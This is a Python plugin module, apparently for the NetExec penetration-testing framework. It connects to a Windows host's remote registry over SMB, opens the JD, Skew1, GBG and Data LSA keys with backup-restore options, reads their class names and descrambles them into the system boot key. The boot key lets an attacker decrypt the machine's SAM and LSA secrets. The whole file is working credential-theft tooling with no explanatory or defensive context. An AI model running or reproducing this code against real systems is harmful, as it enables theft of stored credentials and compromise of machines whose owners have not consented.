from impacket.dcerpc.v5 import transport, rrp
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
from nxc.helpers.misc import CATEGORY
class NXCModule:
    name = "bofetch2"
    description = "read bootkey via rrp backup-open class names"
    supported_protocols = ["smb"]
    category = CATEGORY.PRIVILEGE_ESCALATION
    def options(self, context, module_options): pass
    def on_login(self, context, connection):
        try: connection.trigger_winreg()
        except Exception: pass
        rpc = transport.DCERPCTransportFactory(r"ncacn_np:445[\pipe\winreg]")
        rpc.set_smb_connection(connection.conn)
        if connection.kerberos:
            rpc.set_kerberos(connection.kerberos, kdcHost=connection.kdcHost)
        dce = rpc.get_dce_rpc()
        if connection.kerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect(); dce.bind(rrp.MSRPC_UUID_RRP)
        hklm = rrp.hOpenLocalMachine(dce)['phKey']
        tmp = ""
        for k in ["JD","Skew1","GBG","Data"]:
            sub = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\" + k
            ans = rrp.hBaseRegOpenKey(dce, hklm, sub, dwOptions=rrp.REG_OPTION_BACKUP_RESTORE|rrp.REG_OPTION_OPEN_LINK, samDesired=rrp.KEY_READ)
            info = rrp.hBaseRegQueryInfoKey(dce, ans['phkResult'])
            cls = info['lpClassOut'][:-1] if info['lpClassOut'][-1:]=='\x00' else info['lpClassOut']
            context.log.highlight(f"{k}={cls}")
            tmp += cls
        p = [0x8,0x5,0x4,0x2,0xb,0x9,0xd,0x3,0x0,0x6,0x1,0xc,0xe,0xa,0xf,0x7]
        try:
            scr = bytes.fromhex(tmp)
            bk = bytes(scr[p[i]] for i in range(16))
            context.log.highlight(f"BOOTKEY {bk.hex()}")
        except Exception as e:
            context.log.fail(f"descramble: {e} tmp={tmp}")
        dce.disconnect()
